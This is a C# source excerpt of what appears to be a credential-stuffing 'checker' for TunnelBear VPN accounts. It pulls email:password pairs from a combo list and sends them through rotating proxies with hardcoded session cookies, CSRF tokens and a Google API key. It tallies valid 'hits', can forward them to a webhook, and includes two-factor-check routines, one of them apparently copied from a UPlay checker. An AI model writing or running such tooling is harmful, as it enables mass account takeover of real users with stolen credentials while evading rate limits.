...
namespace ZuttPal
{
	internal class tunnelbear1kek
	{
		...
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!tunnelbear1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (tunnelbear1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								...
								httpRequest.Proxy = tunnelbear1check.RandomProxies();
								...
								string user = Base64Encode(email);
								...
								httpRequest.AddHeader("cookie", "PLAY_SESSION=b4311cd6aa362d26afae9a273d2c8cea8be5ff2e-___AT=fcc04056e135e1cde986300bd007484fa85ac45a&tbcsrf=fcc04056e135e1cde986300bd007484fa85ac45a&___TS=1622480460002");
								httpRequest.AddHeader("origin", "https://www.tunnelbear.com");
								httpRequest.AddHeader("pragma", "no-cache");
								httpRequest.AddHeader("referer", "https://www.tunnelbear.com/");
								httpRequest.AddHeader("sec-fetch-dest", "empty");
								httpRequest.AddHeader("sec-fetch-mode", "cors");
								httpRequest.AddHeader("sec-fetch-site", "same-site");
								httpRequest.AddHeader("tb-csrf-token", "fcc04056e135e1cde986300bd007484fa85ac45a");
								...
								Leaf.xNet.HttpResponse PostRequest = httpRequest.Get("https://prod-api-core.tunnelbear.com/core/web/csrf");

								Console.WriteLine(result);
								//string strong = "$"username={user}&password={pass}&withUserDetails=true&v=web-1.0""
								//string login = httpRequest.Post("https://prod-api-core.tunnelbear.com/core/web/api/login", $"username={user}&password={pass}&withUserDetails=true&v=web-1.0", "");
								//string login = httpRequest.Post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmD2NO99t3N6p6n3Zw3p2U0pBVy82MgWo", data, "application/json").ToString();
								//if (login.Contains("EMAIL_NOT_FOUND") || login.Contains("INVALID_PASSWORD"))
								//{
								//	lock (Program.WriteLock)
								//	{
								//		Interlocked.Increment(ref tunnelbear1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
								//		Interlocked.Increment(ref tunnelbear1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
								//		Interlocked.Increment(ref tunnelbear1check.Bad); Interlocked.Increment(ref stats.bad);
								...
								//
								//}
								//else if (login.Contains("idToken"))
								//{
								//	Interlocked.Increment(ref tunnelbear1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
								//	Interlocked.Increment(ref tunnelbear1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
								//	Interlocked.Increment(ref tunnelbear1check.Hits); Interlocked.Increment(ref stats.hits);
								//	if (Program.config.hitstowebhook == "True") { stats.result(acc); }
								...
								//	Interlocked.Increment(ref tunnelbear1check.retry);
								//	break;
								//}
							}
							catch (Exception)
							{
								...
								string acc1 = email + ":" + password;
								tunnelbear1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref tunnelbear1check.retry);
								break;
							}
						}
			...
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						...
						if (httpRequest.Get(tunnelbear1kek.SFACheckUri).ToString() == "[]")
							return true;
						break;
					}
				}
				...
				{
					Interlocked.Increment(ref tunnelbear1check.Errors);
				}
			}
			return false;
		}
		...
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					...
					{
						req.Proxy = tunnelbear1check.RandomProxies();
